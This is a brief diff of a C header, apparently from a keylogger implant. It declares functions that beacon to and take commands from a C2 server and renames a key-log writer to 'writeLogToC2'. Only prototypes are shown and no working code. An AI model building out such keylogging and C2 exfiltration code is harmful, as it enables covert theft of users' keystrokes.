@@ -32,7 +32,7 @@ RET_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey);
 
 // functions utilised by the worker threads!
 RET_CODE pollCommandsAndBeacon(CLIENT_HANDLER* client); // beacon and recieve commands from the C2
-RET_CODE writeKeyLog(CLIENT_HANDLER* client, KEY_LOGGER* kLogger);  // write 
+RET_CODE writeLogToC2(CLIENT_HANDLER* client, KEY_LOGGER* kLogger);  // write 
 
 void clientCleanup(CLIENT_HANDLER* client);
 
